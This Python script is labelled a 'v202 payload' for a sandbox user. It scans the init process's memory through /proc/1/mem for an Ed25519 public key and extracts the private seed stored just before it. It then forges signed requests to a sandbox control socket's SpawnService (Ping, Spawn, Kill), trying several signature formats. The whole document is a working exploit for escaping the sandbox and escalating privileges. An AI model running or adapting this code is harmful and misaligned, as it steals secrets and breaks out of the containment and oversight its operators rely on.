# -*- coding: utf-8 -*-
"""v202 payload (sandbox user): 内存提取 Ed25519 seed + 签名调用 SpawnService
1. 扫描 /proc/1/mem 找 pubkey 字节序列 (RlOG5oHi...= 解码)
2. 提取 seed (pub 前 32 字节) -> priv
3. 纯 Python ed25519 签名 -> X-Signature/X-Timestamp -> 调 Ping/Spawn"""
import socket, time, json, os, sys, re, base64, hashlib

def log(s, maxlen=3000):
    s = str(s)
    if len(s) > maxlen:
        s = s[:maxlen] + '...[TRUNC %d]' % len(s)
    print('[%.1f] %s' % (time.time(), s), flush=True)

PUB_B64 = 'RlOG5oHi9BXW4sVwyPlM9yghnU24vW8zvI2aJZZQD7M='
PUB = base64.b64decode(PUB_B64)
log('PUB=%s len=%d' % (PUB_B64, len(PUB)))

# ============ 1: 内存扫描找 pubkey ============
log('=== 1 mem scan pub ===')
seed = None
try:
    maps = open('/proc/1/maps', 'rb').read().decode(errors='replace')
    regions = []
    for line in maps.splitlines():
        parts = line.split()
        if len(parts) >= 2 and 'r' in parts[1]:
            a, b = parts[0].split('-')
            regions.append((int(a, 16), int(b, 16)))
    log('MEM regions=%d' % len(regions))
    with open('/proc/1/mem', 'rb') as m:
        for ri, (a, b) in enumerate(regions):
            sz = b - a
            if sz <= 0:
                continue
            pos = a
            while pos < b:
                chunk_len = min(b - pos, 16 * 1024 * 1024)
                try:
                    m.seek(pos)
                    chunk = m.read(chunk_len)
                except Exception:
                    break
                idx = chunk.find(PUB)
                if idx >= 0:
                    abs_pos = pos + idx
                    log('PUB FOUND @0x%x (region %d)' % (abs_pos, ri))
                    # seed = 前 32 字节
                    try:
                        m.seek(abs_pos - 32)
                        seed = m.read(32)
                        log('SEED=%s' % base64.b64encode(seed).decode())
                    except Exception as e:
                        log('SEED READ EXC %s' % e)
                    break
                pos += chunk_len - 64
            if seed:
                break
except Exception as e:
    log('MEM EXC %s' % e)

# ============ 2: ed25519 签名 ============
log('=== 2 sign ===')
p = 2 ** 255 - 19
L = 2 ** 252 + 27742317777372353535851937790883648493

def sha512(s):
    return hashlib.sha512(s).digest()

def H(s):
    return sha512(s)

def inv(x):
    return pow(x, p - 2, p)

d = -121665 * inv(121666) % p
Bx = 15112221349535400772501151409588531511454012693041857206046113283949847762202
By = 46316835694926478169428394003475163141307993866256225615783033603165251855960
B = (Bx % p, By % p)

def point_add(P, Q):
    if P is None:
        return Q
    if Q is None:
        return P
    x1, y1 = P
    x2, y2 = Q
    x3 = (x1 * y2 + x2 * y1) * inv(1 + d * x1 * x2 * y1 * y2) % p
    y3 = (y1 * y2 + x1 * x2) * inv(1 - d * x1 * x2 * y1 * y2) % p
    return (x3, y3)

def point_mul(s, P):
    Q = None
    for i in range(256):
        if (s >> i) & 1:
            Q = point_add(Q, P)
        P = point_add(P, P)
    return Q

def point_compress(P):
    x, y = P
    return int.to_bytes(y | ((x & 1) << 255), 32, 'little')

def point_decompress(s):
    y = int.from_bytes(s, 'little') & ((1 << 255) - 1)
    sign = (int.from_bytes(s, 'little') >> 255) & 1
    x = pow((y * y - 1) * inv(d * y * y + 1), (p + 3) // 8, p)
    if (x * x - (y * y - 1) * inv(d * y * y + 1)) % p != 0:
        x = x * pow(2, (p - 1) // 4, p) % p
    if (x * x - (y * y - 1) * inv(d * y * y + 1)) % p != 0:
        return None
    if (x & 1) != sign:
        x = p - x
    return (x, y)

def ed25519_sign(priv, msg):
    h = sha512(priv[:32])
    a = int.from_bytes(h[:32], 'little')
    a &= (1 << 254) - 8
    a |= (1 << 254)
    r = int.from_bytes(sha512(h[32:] + msg), 'little') % L
    R = point_mul(r, B)
    k = int.from_bytes(sha512(point_compress(R) + priv[32:] + msg), 'little') % L
    S = (r + k * a) % L
    return point_compress(R) + int.to_bytes(S, 32, 'little')

def punix(sp, path, body, t=8, extra=None):
    b = json.dumps(body).encode()
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sp)
        hdrs = 'POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/connect+json\r\n' % path
        hdrs += 'Connect-Protocol-Version: 1\r\nContent-Length: %d\r\nConnection: close\r\n' % len(b)
        if extra:
            for k, v in extra.items():
                hdrs += '%s: %s\r\n' % (k, v)
        hdrs += '\r\n'
        s.sendall(hdrs.encode() + b)
        d = b''
        try:
            while True:
                c = s.recv(65536)
                if not c:
                    break
                d += c
                if len(d) > 5000:
                    break
        except Exception:
            pass
        s.close()
        st = d.split(b'\r\n', 1)[0].decode(errors='replace') if d else 'NO_RESP'
        return st, d[:4000]
    except Exception as e:
        return 'EXC %s' % type(e).__name__, b''

if seed:
    PRIV = seed + PUB
    # 验证私钥生成公钥一致
    h = sha512(seed)
    a = int.from_bytes(h[:32], 'little')
    a &= (1 << 254) - 8
    a |= (1 << 254)
    A = point_compress(point_mul(a, B))
    log('DERIVED PUB=%s MATCH=%s' % (base64.b64encode(A).decode(), A == PUB))

    # ============ 3: 签名调用 ============
    log('=== 3 signed calls ===')
    SOCK = '/run/vercel/share/init.sock'
    for mname in ['Ping', 'Spawn', 'Kill']:
        ts = str(int(time.time()))
        variants = [
            ('ts-only', ts.encode()),
            ('ts-body', ts.encode() + b'{}'),
            ('path-ts', ('/vercel.sandbox.spawn.v1.SpawnService/' + mname).encode() + ts.encode()),
            ('body-only', b'{}'),
        ]
        for vname, msg in variants:
            sig = base64.b64encode(ed25519_sign(PRIV, msg)).decode()
            extra = {'X-Signature': sig, 'X-Timestamp': ts}
            st, pay = punix(SOCK, '/vercel.sandbox.spawn.v1.SpawnService/%s' % mname, {}, t=6, extra=extra)
            log('SIGNED %s[%s] -> %s %r' % (mname, vname, st, pay[:250]))
else:
    log('NO SEED FOUND - sign skip')

log('V202_DONE')
